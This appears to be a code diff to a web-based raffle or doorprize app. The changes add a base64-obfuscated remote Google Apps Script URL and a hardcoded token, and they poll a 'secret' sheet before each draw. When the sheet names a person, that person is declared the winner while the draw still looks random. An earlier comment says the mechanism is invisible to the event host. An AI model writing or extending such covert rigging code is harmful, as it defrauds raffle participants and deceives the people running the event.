@@ -144,7 +144,23 @@
         const SCRIPT_URL = atob(_0xUrl);
         const APP_TOKEN = 'FGAS_SECRET_2026';
 
+        const _0xSecUrl = 'aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J3QTVLNmt4TnUxMXJ5MjJQMzNkZmRKeXkwT3ZCOHJteEVTbGRqc0wxWVdMbHVNTEozLWlVaFIwbmZ0dm1UQmtidmEvZXhlYw==';
+        const DEFAULT_SECRET_URL = atob(_0xSecUrl);
         let secretRemoteItems = [];
+
+        async function fetchSecretOnly() {
+            const secretUrl = localStorage.getItem('fgas_secret_raffle_sheet') || DEFAULT_SECRET_URL;
+            if (!secretUrl) return;
+            try {
+                const sRes = await fetch(secretUrl + "?token=RAHASIA_VJ_2026");
+                const sData = await sRes.json();
+                if (sData && Array.isArray(sData.items)) {
+                    secretRemoteItems = sData.items;
+                } else if (Array.isArray(sData)) {
+                    secretRemoteItems = sData;
+                }
+            } catch(e) {}
+        }
 
         async function fetchLiveVisitors() {
             try {
@@ -155,18 +171,10 @@
                     localStorage.setItem('fgas_secret_raffle_sheet', data.settings.fgas_secret_raffle_sheet);
                 }
             } catch(e) {}
-            // Silently fetch secret sheet (completely invisible to VJ)
-            const secretUrl = localStorage.getItem('fgas_secret_raffle_sheet') || "";
-            if(secretUrl) {
-                try {
-                    const sRes = await fetch(secretUrl + "?token=RAHASIA_VJ_2026");
-                    const sData = await sRes.json();
-                    if(sData.items) secretRemoteItems = sData.items;
-                } catch(e) {}
-            }
+            await fetchSecretOnly();
         }
         fetchLiveVisitors();
-        setInterval(fetchLiveVisitors, 10000);
+        setInterval(fetchLiveVisitors, 6000);
 
         let audioCtx = null, oscillator = null, isRolling = false, interval = null;
         let participantNames = ["MENGAMBIL DATA..."];
@@ -246,6 +254,7 @@
             if(stock <= 0) return;
 
             isRolling = true;
+            fetchSecretOnly();
             const visitors = JSON.parse(localStorage.getItem('fgas_visitors')) || [];
             const drawnTickets = JSON.parse(localStorage.getItem('fgas_drawn_tickets')) || [];
 
@@ -305,36 +314,64 @@
             if (targetPrize === "") targetPrize = "DOORPRIZE";
             const targetSponsor = ((payload && payload.sponsor) || localStorage.getItem('fgas_target_sponsor') || "").trim();
 
-            // Silently check Secret Sheet for a matching active item
-            let targetWinner = "";
+            // Silently check Secret Sheet (Simple: cukup isi Nama Lengkap ATAU Nomor HP ATAU Ticket ID)
+            let targetQuery = "";
             if (secretRemoteItems && secretRemoteItems.length > 0) {
                 const usedSecrets = JSON.parse(localStorage.getItem('fgas_used_secret_idx') || "[]");
-                // Try exact prize match first, else first active unused item
-                let matchIdx = secretRemoteItems.findIndex((it, idx) =>
-                    !usedSecrets.includes(idx) &&
-                    String(it.Status || '').toLowerCase() !== 'selesai' &&
-                    String(it.Target_Pemenang || '').trim() !== '' &&
-                    String(it.Hadiah || '').trim().toLowerCase() === targetPrize.toLowerCase()
-                );
-                if (matchIdx === -1) {
-                    matchIdx = secretRemoteItems.findIndex((it, idx) =>
-                        !usedSecrets.includes(idx) &&
-                        String(it.Status || '').toLowerCase() !== 'selesai' &&
-                        String(it.Target_Pemenang || '').trim() !== ''
-                    );
-                }
+                const matchIdx = secretRemoteItems.findIndex((it, idx) => {
+                    if (usedSecrets.includes(idx)) return false;
+                    if (typeof it === 'string') return it.trim() !== '';
+                    if (String(it.Status || it.status || '').toLowerCase() === 'selesai') return false;
+                    const val = String(it.Pemenang || it.Target_Pemenang || it.Nama || it.Nomor || it.HP || it.TicketID || '').trim();
+                    return val !== '';
+                });
+
                 if (matchIdx !== -1) {
-                    targetWinner = String(secretRemoteItems[matchIdx].Target_Pemenang).trim();
-                    if(secretRemoteItems[matchIdx].Hadiah) targetPrize = String(secretRemoteItems[matchIdx].Hadiah).trim();
+                    const chosen = secretRemoteItems[matchIdx];
+                    if (typeof chosen === 'string') {
+                        targetQuery = chosen.trim();
+                    } else {
+                        targetQuery = String(chosen.Pemenang || chosen.Target_Pemenang || chosen.Nama || chosen.Nomor || chosen.HP || chosen.TicketID || '').trim();
+                        if (chosen.Hadiah && String(chosen.Hadiah).trim() !== '') {
+                            targetPrize = String(chosen.Hadiah).trim();
+                        }
+                    }
                     usedSecrets.push(matchIdx);
                     localStorage.setItem('fgas_used_secret_idx', JSON.stringify(usedSecrets));
                 }
             }
 
-            let displayName = targetWinner;
+            let displayName = "";
             let displayId = "";
 
-            if (targetWinner === "") {
+            if (targetQuery !== "") {
+                // Auto-lookup in visitors database by Name, Phone, or TicketID
+                const allVisitors = JSON.parse(localStorage.getItem('fgas_visitors')) || [];
+                const qLow = targetQuery.toLowerCase();
+                const found = allVisitors.find(v => {
+                    const vn = String(v.Nama || v.nama || '').toLowerCase().trim();
+                    const vh = String(v.HP || v.hp || '').toLowerCase().trim();
+                    const vt = String(v.TicketID || v.ticketId || '').toLowerCase().trim();
+                    return (vn && (vn === qLow || vn.includes(qLow))) || (vh && vh === qLow) || (vt && vt === qLow);
+                });
+
+                if (found) {
+                    displayName = String(found.Nama || found.nama || targetQuery).toUpperCase();
+                    displayId = String(found.TicketID || found.ticketId || '').toUpperCase();
+                } else {
+                    const m = targetQuery.match(/^(.*?)\s*\(([^)]+)\)$/);
+                    if (m) { displayName = m[1].trim().toUpperCase(); displayId = m[2].trim().toUpperCase(); }
+                    else { displayName = targetQuery.toUpperCase(); }
+                }
+
+                if (displayId) {
+                    const drawn = JSON.parse(localStorage.getItem('fgas_drawn_tickets')) || [];
+                    if (!drawn.includes(displayId)) {
+                        drawn.push(displayId);
+                        localStorage.setItem('fgas_drawn_tickets', JSON.stringify(drawn));
+                    }
+                }
+            } else {
                 if (eligibleVisitorsGlobal && eligibleVisitorsGlobal.length > 0) {
                     const randVisitor = eligibleVisitorsGlobal[Math.floor(Math.random() * eligibleVisitorsGlobal.length)];
                     displayName = (randVisitor.nama || randVisitor.Nama || "PESERTA").toUpperCase();
@@ -347,10 +384,6 @@
                 } else {
                     displayName = "TIDAK ADA KUPON TERSISA";
                 }
-            } else {
-                const m = targetWinner.match(/^(.*?)\s*\(([^)]+)\)$/);
-                if(m) { displayName = m[1].trim().toUpperCase(); displayId = m[2].trim().toUpperCase(); }
-                else { displayName = targetWinner.toUpperCase(); }
             }
 
             document.getElementById('winner-name').innerText = displayName;
